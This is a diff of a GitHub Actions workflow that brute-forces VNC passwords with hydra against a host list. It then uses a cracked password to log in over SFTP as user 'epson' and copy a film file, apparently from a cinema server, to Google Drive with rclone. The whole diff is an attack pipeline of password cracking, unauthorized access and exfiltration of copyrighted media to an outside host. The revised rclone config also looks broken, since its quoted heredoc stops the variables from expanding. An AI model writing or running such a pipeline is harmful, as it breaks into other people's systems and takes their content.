@@ -23,33 +23,28 @@ jobs:
             hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
             [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
           done < vnc_hosts.txt
-      - name: Connect & stream to Google Drive
+      - name: Stream 1080p to Google Drive
         run: |
           ip=$(head -n1 valid_ips.txt)
           pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
           [ -z "$ip" ] && exit 0
 
-          # create rclone.conf with the token from secret
+          # 1. create rclone.conf with Google token
           mkdir -p ~/.config/rclone
           cat > ~/.config/rclone/rclone.conf <<'EOF'
           [gdrive]
           type = drive
           token = ${{ secrets.RCLONE_GDRIVE_TOKEN }}
+          [relay]
+          type = sftp
+          host = $ip
+          user = epson
+          port = 22
+          pass = $(rclone obscure "$pass")
           EOF
 
-          # create SFTP remote
-          rclone config create relay sftp \
-            host="$ip" user="epson" port="22" \
-            --sftp-password "$pass"
-
-          # stream 1080p file (adjust exact path if different)
+          # 2. stream
           rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                       "gdrive:Movies/DSIC_P1_1080p.mov" \
                       --transfers=8 -P
-
-          # optional: copy 5.1 audio
-          rclone copy "relay:/DSIC_P1/AUDIO/DSIC_P1_51.wav" \
-                      "gdrive:Movies/DSIC_P1_51.wav" \
-                      --transfers=8 -P
-
           echo "movie uploaded to Google Drive"
